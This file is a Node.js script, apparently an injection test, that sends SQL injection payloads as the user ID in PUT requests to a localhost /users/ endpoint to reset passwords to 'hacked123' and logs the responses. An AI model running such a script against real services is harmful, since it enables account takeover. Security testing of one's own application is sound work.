import axios from 'axios';
import fs from 'fs';
import path from 'path';

// Target base URL
const baseURL = 'http://localhost:5000/users/';

// SQL injection test payloads
const payloads = [
  "' OR '1'='1",
  "' OR '1'='1' --",
  "' OR 'a'='a"
];

// The new password you want to inject
const newPassword = 'hacked123';

// Log file path
const logPath = path.resolve('./injection-test.log');

function logToFile(message) {
  const timestamp = new Date().toISOString();
  const fullMessage = `[${timestamp}] ${message}\n`;
  fs.appendFileSync(logPath, fullMessage);
}

async function testSqlInjection() {
  for (const payload of payloads) {
    const encodedPayload = encodeURIComponent(payload);
    const targetURL = baseURL + encodedPayload;

    const header = `\n---\nTesting payload: ${payload}`;
    console.log(header);
    logToFile(header);

    try {
      const response = await axios.put(targetURL, {
        newPass: newPassword
      }, {
        headers: {
          'Content-Type': 'application/json'
        }
      });

      const successLog = `Status Code: ${response.status}\nResponse Body: ${JSON.stringify(response.data, null, 2)}`;
      console.log(successLog);
      logToFile(successLog);

    } catch (error) {
      if (error.response) {
        const errorLog = `Status Code: ${error.response.status}\nResponse Body: ${JSON.stringify(error.response.data, null, 2)}`;
        console.error(errorLog);
        logToFile(errorLog);
      } else {
        const failLog = `Request failed: ${error.message}`;
        console.error(failLog);
        logToFile(failLog);
      }
    }
  }
}

testSqlInjection();
